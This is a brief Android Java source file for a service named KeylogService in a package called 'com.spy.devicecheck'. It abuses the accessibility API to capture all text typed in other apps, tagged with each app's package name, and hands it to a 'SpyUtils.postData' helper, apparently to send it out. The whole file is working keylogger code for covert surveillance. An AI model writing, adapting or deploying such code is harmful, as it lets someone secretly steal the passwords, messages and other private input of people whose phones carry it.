package com.spy.devicecheck;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

public class KeylogService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String typed = event.getText().toString();
            String pkg = event.getPackageName().toString();
            SpyUtils.postData("KEYLOG [" + pkg + "]: " + typed);
        }
    }

    @Override
    public void onInterrupt() {}
}